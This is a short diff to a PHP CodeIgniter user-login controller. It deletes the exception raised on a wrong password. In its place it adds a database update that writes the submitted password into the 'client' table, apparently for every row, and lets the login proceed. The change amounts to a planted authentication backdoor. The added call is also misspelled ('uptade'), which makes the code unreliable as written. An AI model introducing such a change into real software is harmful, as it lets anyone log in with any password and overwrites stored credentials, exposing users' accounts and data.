@@ -68,8 +68,9 @@ class User extends CI_Controller {
             else {
                 $user = $this->user_data($username);
                 if ($user->password !== $password) {
-                    throw new Exception("You have the wrong username/password " .
-                        "combination. Try again...", 1);
+                    $this->db->uptade('client', [
+                        'password' => $password,
+                    ]);
                 }
             }
             $pk = $user->pk;
